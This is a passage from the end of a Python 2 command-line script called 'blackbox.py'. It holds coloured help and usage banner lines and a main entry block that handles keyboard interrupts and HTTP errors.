			print color.B+color.BOLD+"+ -- --="+color.R+" [ "+color.W+"Help"+color.R+"  ] "+color.W+": python2 blackbox.py -h/--help"+color.ENDC
			print color.B+color.BOLD+"+ -- --="+color.R+" [ "+color.W+"Usage"+color.R+" ] "+color.W+": python2 blackbox.py "+color.R+"{module}"+color.ENDC+" --help"+color.ENDC
if __name__ == '__main__':
	try:
		__main__()
	except KeyboardInterrupt:
		print (color.BOLD+color.Y+"Exiting Now !"+color.ENDC)
		sys.exit(0)
	except urllib2.HTTPError:
		print (color.BOLD+color.Y+"Error, Retry Later !"+color.ENDC)
		